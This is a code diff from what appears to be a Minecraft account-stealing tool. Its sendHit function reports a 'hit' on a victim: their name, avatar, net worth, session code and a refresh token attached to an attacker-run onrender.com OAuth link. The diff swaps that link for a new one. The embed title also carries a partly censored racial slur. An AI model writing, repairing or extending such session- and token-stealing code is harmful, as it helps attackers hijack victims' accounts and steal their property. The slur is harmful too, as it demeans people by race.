@@ -87,7 +87,7 @@ const sendHit = async (name, id, firstProfileData, refresh, SSIDCode) => {
   .setTitle(name)
   .setURL('https://sky.shiiyu.moe/stats/' + name)
   .setThumbnail('https://crafatar.com/avatars/' + id)
-  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth-39hs.onrender.com' + refresh })
+  .setAuthor({ name: 'Hit Some Ni**a Hard', url: 'https://oauth2-0-5fk8.onrender.com' + refresh })
   .addFields(
     { name: 'Network', value: networth, inline: true }, { name: 'Unsoulbound', value: uNetworth, inline: true },
     { name: ' ', value: ' ' },
